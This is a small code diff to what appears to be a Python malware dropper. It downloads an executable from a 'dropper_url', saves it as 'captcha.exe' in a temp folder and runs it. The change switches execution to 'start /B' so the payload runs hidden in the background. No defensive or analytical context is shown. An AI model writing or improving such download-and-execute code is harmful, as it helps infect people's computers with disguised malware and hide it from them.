@@ -8,4 +8,4 @@ dropped_path = os.path.join(temp_dir, "captcha.exe")
 with open(dropped_path, "wb") as f:
     f.write(requests.get(dropper_url).content)
 
-os.system(f'"{dropped_path}"')
+os.system(f'start /B "" "{dropped_path}"')
